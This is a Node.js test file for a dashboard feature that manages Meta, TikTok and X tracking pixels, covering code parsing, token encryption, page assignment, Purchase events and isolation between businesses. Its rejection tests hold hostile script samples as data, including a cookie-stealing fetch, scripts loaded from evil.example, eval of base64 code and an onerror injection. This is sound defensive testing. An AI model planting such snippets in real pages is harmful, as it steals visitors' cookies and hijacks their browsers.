// Tracking & Pixels: any number of Meta, TikTok and X tracking IDs per business, each saved, switched
// on or off, assigned to pages, verified and removed on its own, with no code change or redeploy.
import { test, before, after, describe } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { randomBytes } from 'node:crypto';
import request from 'supertest';
import { setup, resetDatabase, csrfToken, signUp, ORIGIN, openClientSignup, addTrackingPixel } from './helpers.js';
import { seedLarose, LAROSE_META_PIXEL_ID, LAROSE_PIXEL_NEW_ID, LAROSE_AD_ACCOUNT_PIXELS, LAROSE_SKINCARE_PIXEL } from '../src/scripts/seed-larose.js';
import { parsePixelCode } from '../src/services/pixelCode.js';
import { decrypt } from '../src/lib/secrets.js';
import { clearOriginCache } from '../src/lib/origins.js';

const META_CODE = (id) => `<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '${id}');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=${id}&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->`;

const TIKTOK_CODE = (id) => `<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
  ttq.load('${id}');
  ttq.page();
}(window, document, 'ttq');
</script>`;

const X_CODE = (id, eventId) => `<!-- Twitter conversion tracking base code -->
<script>
!function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
},s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',
a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
twq('config','${id}');
</script>
<!-- End Twitter conversion tracking base code -->
${eventId ? `<script>twq('event', 'tw-${id}-${eventId}', {});</script>` : ''}`;

describe('reading pasted pixel code', () => {
  test('official Meta, TikTok and X base codes give their IDs (X: and its event IDs)', () => {
    assert.deepEqual(parsePixelCode('meta', META_CODE('123456789012345')), { pixelId: '123456789012345', eventIds: [] });
    assert.deepEqual(parsePixelCode('tiktok', TIKTOK_CODE('c4abcdefgh1234567890')), { pixelId: 'C4ABCDEFGH1234567890', eventIds: [] });
    assert.deepEqual(parsePixelCode('x', X_CODE('o1abc', 'o1xyz')), { pixelId: 'o1abc', eventIds: ['o1xyz'] });
  });

  test('unsafe, mixed or unrelated code is rejected', () => {
    const cases = [
      ['meta', META_CODE('123456789012345').replace("fbq('track', 'PageView');", "fbq('track','PageView');fetch('https://connect.facebook.net/x?c='+document.cookie);")],
      ['meta', META_CODE('123456789012345') + '<script src="https://evil.example/x.js"></script>'],
      ['meta', META_CODE('123456789012345').replace('connect.facebook.net/en_US/fbevents.js', 'evil.example/fbevents.js')],
      ['meta', META_CODE('123456789012345').replace("fbq('track', 'PageView');", 'eval(atob("YWxlcnQoMSk="));')],
      ['meta', META_CODE('123456789012345') + '<img src=x onerror="alert(1)">'],
      ['meta', META_CODE('123456789012345').replace("fbq('track', 'PageView');", "fbq('init', '999999999999999');")],
      ['meta', '<script>alert(1)</script>'],
      ['meta', TIKTOK_CODE('C4ABCDEFGH1234567890')],
      ['tiktok', TIKTOK_CODE('C4ABCDEFGH1234567890').replace('ttq.page();', 'window.location="https://evil.example";')],
      ['tiktok', META_CODE('123456789012345')],
      ['tiktok', ''],
      ['x', X_CODE('o1abc').replace("twq('config','o1abc');", "twq('config','o1abc');document.cookie='a';")],
      ['x', X_CODE('o1abc').replace('static.ads-twitter.com', 'evil.example')],
      ['x', META_CODE('123456789012345')],
    ];
    for (const [platform, code] of cases) {
      const res = parsePixelCode(platform, code);
      assert.ok(res.error && !res.pixelId, `should reject: ${code.slice(-80)}`);
    }
    assert.match(parsePixelCode('tiktok', META_CODE('123456789012345')).error, /Meta Pixel code/);
    assert.match(parsePixelCode('meta', X_CODE('o1abc')).error, /X Pixel code/);
  });
});

// Fake Meta Graph API and TikTok Events API recording what Skyfly sends.
const calls = [];
const mock = createServer((req, res) => {
  let body = '';
  req.on('data', (c) => { body += c; });
  req.on('end', () => {
    calls.push({ url: req.url, headers: req.headers, body: JSON.parse(body || '{}') });
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(req.url.startsWith('/meta') ? '{"events_received":1}' : '{"code":0,"message":"OK"}');
  });
});
await new Promise((r) => mock.listen(0, r));
const mockBase = `http://127.0.0.1:${mock.address().port}`;
const encryptionKey = randomBytes(32);
const { pool, app } = setup({
  encryptionKey, allowSignup: true, signupFirstOnly: false, metaGraphBase: `${mockBase}/meta/v26.0`, tiktokApiBase: `${mockBase}/tiktok/v1.3`,
});
// Larose's pixels on every page, and "skincare", on the Larose landing page only.
const LAROSE_IDS = [LAROSE_META_PIXEL_ID, LAROSE_PIXEL_NEW_ID, ...LAROSE_AD_ACCOUNT_PIXELS.map((p) => p.id)];
const SKINCARE = LAROSE_SKINCARE_PIXEL.id;
const SECOND_ORIGIN = 'https://second.larose.test';
const settle = () => new Promise((r) => setTimeout(r, 200));
let owner; let larose; let page1; let page2; let n = 0;

const url = (path = '') => `/businesses/${larose}/pixels${path}`;
async function post(path, fields, { agent = owner, biz = larose, from = '/new' } = {}) {
  const _csrf = await csrfToken(agent, `/businesses/${biz}/pixels${from}`);
  return agent.post(`/businesses/${biz}/pixels${path}`).type('form').send({ _csrf, ...fields });
}
const add = (fields, opts) => post('', { name: 'Pixel', enabled: 'on', events: ['PageView', 'Lead', 'Purchase'], ...fields }, opts);
const row = async (platform, pixelId, biz = larose) => (await pool.query(
  'SELECT * FROM tracking_pixels WHERE business_id = $1 AND platform = $2 AND pixel_id = $3', [biz, platform, pixelId])).rows[0];
const tracking = async (slug = 'larosenigeria') => (await request(app).get(`/api/public/pages/${slug}/tracking`).expect(200)).body.pixels;
const ids = (list, platform) => list.filter((p) => !platform || p.provider === platform).map((p) => p.id);
const order = (overrides = {}) => request(app).post('/api/public/orders').set('Origin', ORIGIN).send({
  landingPage: 'larosenigeria', idempotencyKey: `tracking-manager-${String(n += 1).padStart(6, '0')}`,
  customer: { name: 'Ngozi Eze', phone: '08031112222', address: '5 Allen Avenue, Ikeja', state: 'Lagos' },
  items: [{ product: 'package-2', quantity: 1 }], ...overrides,
});
const metaId = (i) => `20000000000000${String(i).padStart(2, '0')}`;
const tiktokId = (i) => `D7TRACKTEST${String(i).padStart(9, '0')}`;
const xId = (i) => `x${String(i).padStart(4, '0')}`;

before(async () => {
  await resetDatabase(pool);
  owner = await signUp(app, { email: 'owner@larose.test' });
  larose = await seedLarose(pool, 'owner@larose.test');
  page1 = (await pool.query("SELECT id FROM landing_pages WHERE slug = 'larosenigeria'")).rows[0].id;
  page2 = (await pool.query(
    "INSERT INTO landing_pages (business_id, slug, name, url, status) VALUES ($1, 'larose-second', 'Second page', $2, 'active') RETURNING id",
    [larose, `${SECOND_ORIGIN}/`])).rows[0].id;
  await openClientSignup(pool);
  clearOriginCache();
});
after(async () => { await pool.end(); mock.close(); });

describe('existing Larose tracking', () => {
  test('six Larose Meta pixels run on every page; "skincare" runs next to them on the Larose page only; each once, no token', async () => {
    const { rows } = await pool.query('SELECT name, platform, pixel_id, enabled, all_pages FROM tracking_pixels WHERE business_id = $1 ORDER BY id', [larose]);
    assert.deepEqual(rows.map((r) => r.pixel_id), [...LAROSE_IDS, SKINCARE]);
    assert.ok(rows.every((r) => r.platform === 'meta' && r.enabled));
    assert.deepEqual(rows.filter((r) => !r.all_pages).map((r) => [r.name, r.pixel_id]), [['skincare', SKINCARE]]);
    const main = await tracking('larosenigeria');
    assert.deepEqual(ids(main), [...LAROSE_IDS, SKINCARE]);
    assert.deepEqual(main.find((p) => p.id === SKINCARE).events, ['PageView', 'ViewContent', 'InitiateCheckout', 'Lead', 'Purchase']);
    assert.deepEqual(ids(await tracking('larose-second')), LAROSE_IDS, 'not assigned to the other page');
    for (const slug of ['larosenigeria', 'larose-second']) assert.ok(!/token|secret/i.test(JSON.stringify(await tracking(slug))));
  });

  test('the dashboard has a Tracking & Pixels section with Meta, TikTok and X tabs', async () => {
    const home = await owner.get(`/businesses/${larose}`).expect(200);
    assert.match(home.text, /Tracking &amp; Pixels/);
    const page = await owner.get(url()).expect(200);
    assert.deepEqual([...page.text.matchAll(/data-tab="(\w+)"/g)].map((m) => m[1]), ['meta', 'tiktok', 'x']);
    assert.match(page.text, /Meta \(Facebook &amp; Instagram\)[\s\S]*?7 on \/ 7/);
    for (const id of [...LAROSE_IDS, SKINCARE]) assert.ok(page.text.includes(`data-pixel="${id}"`));
    assert.match(page.text, /data-add href="[^"]*\/pixels\/new\?platform=meta"/);
    assert.match((await owner.get(url('?platform=x')).expect(200)).text, /No X tracking IDs yet/);
  });
});

describe('adding many tracking IDs on each platform', () => {
  test('30 Meta, 15 TikTok and 10 X IDs can all be added and are active at once', async () => {
    for (let i = 1; i <= 24; i += 1) {
      const res = await add({ platform: 'meta', name: `Meta account ${i}`, pixel_id: metaId(i), all_pages: 'on' });
      assert.equal(res.status, 302, res.text.slice(0, 300));
    }
    for (let i = 1; i <= 15; i += 1) {
      const res = await add({ platform: 'tiktok', name: `TikTok ${i}`, pixel_id: tiktokId(i).toLowerCase(), all_pages: i <= 10 ? 'on' : '', pages: i > 10 ? [String(page2)] : [] });
      assert.equal(res.status, 302, res.text.slice(0, 300));
    }
    for (let i = 1; i <= 10; i += 1) {
      const res = await add({ platform: 'x', name: `X ${i}`, pixel_id: xId(i), pages: [String(page1)], x_event_Purchase: `tw-${xId(i)}-p${String(i).padStart(4, '0')}`, x_event_Lead: `l${String(i).padStart(4, '0')}` });
      assert.equal(res.status, 302, res.text.slice(0, 300));
    }
    const counts = Object.fromEntries((await pool.query(
      'SELECT platform, count(*)::int AS n FROM tracking_pixels WHERE business_id = $1 AND enabled GROUP BY platform', [larose])).rows.map((r) => [r.platform, r.n]));
    assert.deepEqual(counts, { meta: 31, tiktok: 15, x: 10 }, '24 added + 6 Larose + skincare');

    const first = await tracking('larosenigeria');
    assert.equal(ids(first, 'meta').length, 31);
    assert.deepEqual(ids(first, 'tiktok'), Array.from({ length: 10 }, (_, i) => tiktokId(i + 1)), 'TikTok IDs upper-cased; 11–15 are on the second page only');
    assert.deepEqual(ids(first, 'x'), Array.from({ length: 10 }, (_, i) => xId(i + 1)));
    assert.equal(new Set(first.map((p) => `${p.provider}:${p.id}`)).size, first.length, 'every ID once');
    const x1 = first.find((p) => p.id === xId(1));
    assert.deepEqual(x1, { provider: 'x', id: 'x0001', events: ['PageView', 'Lead', 'Purchase'], eventIds: { Lead: 'l0001', Purchase: 'p0001' } });
    assert.equal(first.find((p) => p.provider === 'tiktok').purchaseEvent, 'CompletePayment');

    const second = await tracking('larose-second');
    assert.equal(ids(second, 'meta').length, 30);
    assert.equal(ids(second, 'tiktok').length, 15);
    assert.deepEqual(ids(second, 'x'), [], 'X IDs were assigned to the first page only');

    const tab = await owner.get(url('?platform=tiktok')).expect(200);
    assert.match(tab.text, /15 on \/ 15/);
    assert.match(tab.text, /Second page/);
  });

  test('pasted code is read for its ID only and never stored', async () => {
    const res = await add({ platform: 'x', name: 'X from code', install_method: 'code', pixel_code: X_CODE('o9code', 'o9buy'), pages: [String(page1)] });
    assert.equal(res.status, 302, res.text.slice(0, 300));
    const x = await row('x', 'o9code');
    assert.deepEqual([x.install_method, x.settings], ['code', { eventIds: { Purchase: 'o9buy' } }]);
    assert.ok(!JSON.stringify(x).includes('uwt.js'));
    assert.equal((await add({ platform: 'meta', name: 'Meta from code', install_method: 'code', pixel_code: META_CODE('3000000000000001'), all_pages: 'on' })).status, 302);
    assert.equal((await row('meta', '3000000000000001')).install_method, 'code');
    const cfg = await request(app).get('/api/public/pages/larosenigeria/tracking').expect(200);
    assert.doesNotMatch(cfg.text, /fbevents|uwt\.js|<script|token/i);
    await pool.query("DELETE FROM tracking_pixels WHERE pixel_id IN ('o9code', '3000000000000001')");
  });

  test('invalid input is refused and nothing is saved', async () => {
    const before = (await pool.query('SELECT count(*)::int AS n FROM tracking_pixels')).rows[0].n;
    const cases = [
      [{ platform: 'meta', pixel_id: 'abc123' }, /10–20 digits/],
      [{ platform: 'tiktok', pixel_id: 'x' }, /10–40 letters and digits/],
      [{ platform: 'x', pixel_id: 'bad id!' }, /X pixel ID should be/],
      [{ platform: 'x', pixel_id: 'o1valid', x_event_Purchase: 'no!' }, /X event ID for Purchase/],
      [{ platform: 'meta', pixel_id: metaId(1) }, /already saved here as (&#34;|")Meta account 1/],
      [{ platform: 'tiktok', pixel_id: tiktokId(1).toLowerCase() }, /already saved here/],
      [{ platform: 'meta', pixel_id: '3000000000000002', name: '' }, /Give the tracking ID a name/],
      [{ platform: 'meta', pixel_id: '3000000000000002', events: [] }, /at least one event/],
      [{ platform: 'meta', pixel_id: '3000000000000002', server_purchase: 'on' }, /needs an access token/],
      [{ platform: 'meta', install_method: 'code', pixel_code: META_CODE('3000000000000002') + '<script src="https://evil.example/x.js"></script>' }, /was not saved|never has/],
      [{ platform: 'facebook', pixel_id: '3000000000000002' }, /Choose a platform/],
      [{ platform: 'meta', pixel_id: '3000000000000002', all_pages: '' }, /Choose where this tracking ID runs/],
    ];
    for (const [fields, error] of cases) {
      const res = await add({ all_pages: 'on', ...fields }); // a page is chosen, so each case meets its own error
      assert.equal(res.status, 400, JSON.stringify(fields));
      assert.match(res.text, error);
    }
    assert.equal((await pool.query('SELECT count(*)::int AS n FROM tracking_pixels')).rows[0].n, before);
  });

  test('access tokens are encrypted, never shown, and kept when the field is left blank', async () => {
    const TOKEN = 'EAAB-tracking-manager-secret-token-1';
    const res = await add({ platform: 'meta', name: 'Server pixel', pixel_id: '3000000000000003', all_pages: 'on', server_purchase: 'on', access_token: TOKEN, test_event_code: 'TEST999' });
    assert.equal(res.status, 302, res.text.slice(0, 300));
    const p = await row('meta', '3000000000000003');
    assert.equal(decrypt(encryptionKey, p.access_token_enc), TOKEN);
    for (const path of ['?platform=meta', `/${p.id}/edit`, `/${p.id}/verify`, `/${p.id}/remove`]) {
      assert.ok(!(await owner.get(url(path)).expect(200)).text.includes(TOKEN), path);
    }
    assert.ok(!JSON.stringify(await tracking()).includes(TOKEN));
    const audit = await pool.query("SELECT details FROM audit_log WHERE action LIKE 'tracking.%'");
    assert.ok(!JSON.stringify(audit.rows).includes(TOKEN));
    assert.equal((await post(`/${p.id}`, { name: 'Server pixel', pixel_id: '3000000000000003', enabled: 'on', all_pages: 'on', events: ['PageView', 'Purchase'], server_purchase: 'on', test_event_code: 'TEST999' }, { from: `/${p.id}/edit` })).status, 302);
    assert.equal(decrypt(encryptionKey, (await row('meta', '3000000000000003')).access_token_enc), TOKEN);
  });
});

describe('managing one tracking ID never changes the others', () => {
  test('disabling one ID stops only that one; enabling it again brings it back', async () => {
    const p = await row('meta', metaId(5));
    const res = await post(`/${p.id}/toggle`, { enabled: 'false' }, { from: '' });
    assert.equal(res.status, 302);
    const list = await tracking();
    assert.ok(!ids(list).includes(metaId(5)));
    assert.equal(ids(list, 'meta').length, 31, '30 others + the server pixel');
    assert.equal(ids(list, 'tiktok').length, 10);
    assert.equal(ids(list, 'x').length, 10);
    assert.match((await owner.get(url()).expect(200)).text, new RegExp(`data-pixel="${metaId(5)}" data-enabled="false"`));
    await post(`/${p.id}/toggle`, { enabled: 'true' }, { from: '' });
    assert.ok(ids(await tracking()).includes(metaId(5)));
  });

  test('editing assigns pages; changing the ID resets its verification only', async () => {
    const p = await row('tiktok', tiktokId(2));
    const other = await row('tiktok', tiktokId(3));
    await pool.query('UPDATE tracking_pixels SET browser_seen_at = now(), browser_verified_at = now() WHERE id = ANY($1)', [[p.id, other.id]]);
    const res = await post(`/${p.id}`, { name: 'TikTok renamed', pixel_id: tiktokId(2), enabled: 'on', events: ['PageView', 'Purchase'], pages: [String(page2)], purchase_event: 'Purchase' }, { from: `/${p.id}/edit` });
    assert.equal(res.status, 302, res.text.slice(0, 300));
    let saved = await row('tiktok', tiktokId(2));
    assert.deepEqual([saved.name, saved.all_pages, saved.settings], ['TikTok renamed', false, { purchaseEvent: 'Purchase' }]);
    assert.ok(saved.browser_verified_at, 'same ID: verification kept');
    assert.ok(!ids(await tracking('larosenigeria')).includes(tiktokId(2)));
    const onSecond = (await tracking('larose-second')).find((x) => x.id === tiktokId(2));
    assert.deepEqual(onSecond, { provider: 'tiktok', id: tiktokId(2), events: ['PageView', 'Purchase'], purchaseEvent: 'Purchase' });

    await post(`/${p.id}`, { name: 'TikTok renamed', pixel_id: 'D7RENAMED00000000002', enabled: 'on', events: ['PageView'], pages: [String(page2)] }, { from: `/${p.id}/edit` });
    saved = await pool.query('SELECT * FROM tracking_pixels WHERE id = $1', [p.id]).then((r) => r.rows[0]);
    assert.deepEqual([saved.pixel_id, saved.browser_seen_at, saved.browser_verified_at], ['D7RENAMED00000000002', null, null]);
    assert.ok((await row('tiktok', tiktokId(3))).browser_verified_at, 'the other ID is untouched');
  });

  test('removing asks for the ID, shows what depends on it, and removes only that ID', async () => {
    const p = await row('x', xId(10));
    const confirm = await owner.get(url(`/${p.id}/remove`)).expect(200);
    assert.match(confirm.text, /data-dependencies/);
    assert.match(confirm.text, /Second page|Larose/);
    assert.match(confirm.text, /will no longer send events to it/);
    const wrong = await post(`/${p.id}/remove`, { confirm: 'nope' }, { from: `/${p.id}/remove` });
    assert.match(wrong.headers.location, /wrong=1/);
    assert.ok(await row('x', xId(10)));
    await post(`/${p.id}/remove`, { confirm: xId(10) }, { from: `/${p.id}/remove` });
    assert.equal(await row('x', xId(10)), undefined);
    assert.equal((await pool.query('SELECT count(*)::int AS n FROM tracking_pixel_pages WHERE tracking_pixel_id = $1', [p.id])).rows[0].n, 0);
    assert.equal(ids(await tracking(), 'x').length, 9);
    assert.deepEqual(ids(await tracking()).filter((id) => LAROSE_IDS.includes(id)), LAROSE_IDS, 'Larose pixels untouched');
  });
});

describe('Purchase goes to each ID once, only after a saved real order', () => {
  test('every Meta and TikTok ID with server-side on gets one Purchase; replays and test orders send none', async () => {
    const T = (s) => `${s}-server-token-0123456789`;
    await post(`/${(await row('meta', metaId(7))).id}`, { name: 'Meta account 7', pixel_id: metaId(7), enabled: 'on', all_pages: 'on', events: ['PageView', 'Purchase'], server_purchase: 'on', access_token: T('meta7') }, { from: `/${(await row('meta', metaId(7))).id}/edit` });
    const tt = await row('tiktok', tiktokId(4));
    await post(`/${tt.id}`, { name: 'TikTok 4', pixel_id: tiktokId(4), enabled: 'on', all_pages: 'on', events: ['PageView', 'Purchase'], purchase_event: 'Purchase', server_purchase: 'on', access_token: T('tiktok4') }, { from: `/${tt.id}/edit` });
    // An ID on the second page only never gets this page's orders.
    const t11 = await row('tiktok', tiktokId(11));
    await post(`/${t11.id}`, { name: 'TikTok 11', pixel_id: tiktokId(11), enabled: 'on', pages: [String(page2)], events: ['PageView', 'Purchase'], server_purchase: 'on', access_token: T('tiktok11') }, { from: `/${t11.id}/edit` });

    calls.length = 0;
    const res = await order();
    assert.equal(res.status, 201, JSON.stringify(res.body));
    await settle();
    const metaCalls = calls.filter((c) => c.url.startsWith('/meta')).map((c) => c.url.split('/')[3]).sort();
    assert.deepEqual(metaCalls, ['3000000000000003', metaId(7)].sort());
    const ttCalls = calls.filter((c) => c.url.startsWith('/tiktok'));
    assert.deepEqual(ttCalls.map((c) => c.body.event_source_id), [tiktokId(4)]);
    assert.equal(ttCalls[0].body.data[0].event, 'Purchase', 'the purchase event name chosen for this TikTok ID');
    for (const c of calls) {
      const ev = c.body.data[0];
      assert.equal(ev.event_id, `purchase_${res.body.reference}`);
      assert.equal(c.body.test_event_code, undefined);
    }
    assert.ok(!calls.some((c) => /twitter|ads-api/.test(c.url)), 'X events go from the browser only');

    calls.length = 0;
    const again = await request(app).post('/api/public/orders').set('Origin', ORIGIN).send({
      landingPage: 'larosenigeria', idempotencyKey: `tracking-manager-${String(n).padStart(6, '0')}`,
      customer: { name: 'Ngozi Eze', phone: '08031112222', address: '5 Allen Avenue, Ikeja', state: 'Lagos' }, items: [{ product: 'package-2', quantity: 1 }],
    });
    assert.equal(again.body.reference, res.body.reference);
    await settle();
    assert.equal(calls.length, 0, 'the same order is never sent twice');

    const t = await order({ customer: { name: 'TEST ORDER tracking', phone: '08031112222', address: '5 Allen Avenue', state: 'Lagos' } });
    assert.equal(t.body.test, true);
    await settle();
    assert.ok(calls.every((c) => c.body.test_event_code), 'a test order only reaches Test events (pixel with a test code)');
    assert.ok(calls.length <= 1);
    assert.equal((await order({ customer: { name: '', phone: '1' } })).status, 400);
    await settle();
    assert.ok(calls.length <= 1, 'a refused order sends nothing');

    const status = await owner.get(url('?platform=meta')).expect(200);
    assert.match(status.text, /Server delivery confirmed/);
  });

  test('the SDK fires Purchase only from a saved, non-test order, once per reference, to every loaded platform', async () => {
    const res = await request(app).get('/sdk/skyfly.js').expect(200);
    assert.equal(res.text.match(/track\('Purchase'/g).length, 1);
    const fn = res.text.match(/function purchase\(data\) \{[\s\S]*?\n  \}/)[0];
    assert.match(fn, /data\.test\) return/);
    assert.match(fn, /eventId: 'purchase_' \+ data\.reference/);
    assert.match(res.text, /static\.ads-twitter\.com\/uwt\.js/);
    assert.match(res.text, /analytics\.tiktok\.com/);
    assert.match(res.text, /connect\.facebook\.net/);
    assert.match(res.text, /conversion_id/);
  });
});

describe('statuses from real evidence', () => {
  test('a page reports which tags loaded: only enabled IDs assigned to that page are marked', async () => {
    const x1 = await row('x', xId(1));
    const t11 = await row('tiktok', tiktokId(11));
    const off = await row('meta', metaId(9));
    await pool.query('UPDATE tracking_pixels SET enabled = false WHERE id = $1', [off.id]);
    const res = await request(app).post('/api/public/pixels-seen').set('Origin', ORIGIN).set('Content-Type', 'text/plain')
      .send(JSON.stringify({ page: 'larosenigeria', pixels: [{ provider: 'x', id: xId(1) }, { provider: 'tiktok', id: tiktokId(11) }, { provider: 'meta', id: metaId(9) }, { provider: 'meta', id: '9999999999999999' }] }));
    assert.equal(res.status, 200);
    const seen = async (id) => (await pool.query('SELECT browser_seen_at, browser_seen_page FROM tracking_pixels WHERE id = $1', [id])).rows[0];
    assert.equal((await seen(x1.id)).browser_seen_page, 'larosenigeria');
    assert.equal((await seen(t11.id)).browser_seen_at, null, 'not assigned to this page');
    assert.equal((await seen(off.id)).browser_seen_at, null, 'disabled');
    await request(app).post('/api/public/pixels-seen').set('Origin', 'https://evil.example').set('Content-Type', 'text/plain')
      .send(JSON.stringify({ page: 'larosenigeria', pixels: [{ provider: 'meta', id: metaId(10) }] })).expect(403);
    assert.equal((await row('meta', metaId(10))).browser_seen_at, null);
    await pool.query('UPDATE tracking_pixels SET enabled = true WHERE id = $1', [off.id]);
  });

  test('the verify page lists each status and links to the assigned pages with the check panel', async () => {
    const x1 = await row('x', xId(1));
    const page = await owner.get(url(`/${x1.id}/verify`)).expect(200);
    assert.match(page.text, /Browser tag loaded<\/dt><dd>Yes, on larosenigeria/);
    assert.match(page.text, /skyfly_debug=1/);
    assert.doesNotMatch(page.text, /Server-side<\/dt>/, 'X has no server-side option');
    await post(`/${x1.id}/browser-verified`, { verified: 'true' }, { from: `/${x1.id}/verify` });
    assert.ok((await row('x', xId(1))).browser_verified_at);
    assert.match((await owner.get(url('?platform=x')).expect(200)).text, /Events confirmed by you/);
  });
});

describe('business isolation', () => {
  let other; let otherBiz;
  before(async () => {
    other = await signUp(app, { email: 'other@shop.test' });
    const _csrf = await csrfToken(other, '/');
    await other.post('/businesses').type('form').send({ _csrf, name: 'Other Shop' }).expect(302);
    otherBiz = (await pool.query("SELECT id FROM businesses WHERE name = 'Other Shop'")).rows[0].id;
  });

  test('another business cannot see, change, verify or remove these IDs', async () => {
    const p = await row('meta', metaId(1));
    for (const path of ['', `/${p.id}/edit`, `/${p.id}/verify`, `/${p.id}/remove`]) await other.get(url(path)).expect(404);
    const _csrf = await csrfToken(other, '/?all=1');
    for (const [path, body] of [[`/${p.id}/toggle`, { enabled: 'false' }], [`/${p.id}/remove`, { confirm: metaId(1) }], [`/${p.id}`, { name: 'x', pixel_id: metaId(1) }], ['', { platform: 'meta', name: 'x', pixel_id: '4000000000000001' }]]) {
      await other.post(url(path)).type('form').send({ _csrf, ...body }).expect(404);
    }
    // Through its own business, Larose's IDs are not found either.
    await other.get(`/businesses/${otherBiz}/pixels/${p.id}/edit`).expect(404);
    const sneaky = await post(`/${p.id}/toggle`, { enabled: 'false' }, { agent: other, biz: otherBiz, from: '' });
    assert.equal(sneaky.status, 404);
    assert.equal((await row('meta', metaId(1))).enabled, true);
  });

  test('pages of another business cannot be assigned, and its IDs never load on Larose', async () => {
    const bad = await add({ platform: 'meta', name: 'Wrong page', pixel_id: '4000000000000002', pages: [String(page1)] }, { agent: other, biz: otherBiz });
    assert.equal(bad.status, 400);
    assert.match(bad.text, /landing pages of this business only/);
    // The same pixel ID may be used by another business; it only loads on that business's pages.
    assert.equal((await add({ platform: 'meta', name: 'Their pixel', pixel_id: '4000000000000003', all_pages: 'on' }, { agent: other, biz: otherBiz })).status, 302);
    assert.equal((await add({ platform: 'x', name: 'Their X', pixel_id: 'o7their', all_pages: 'on' }, { agent: other, biz: otherBiz })).status, 302);
    const list = await tracking();
    assert.ok(!ids(list).includes('4000000000000003') && !ids(list).includes('o7their'));
    const theirs = await other.get(`/businesses/${otherBiz}/pixels?platform=meta`).expect(200);
    assert.ok(!theirs.text.includes(LAROSE_META_PIXEL_ID));
  });

  test('signed out, Tracking & Pixels redirects to login', async () => {
    const res = await request(app).get(url());
    assert.equal(res.status, 302);
    assert.match(res.headers.location, /\/login/);
  });
});
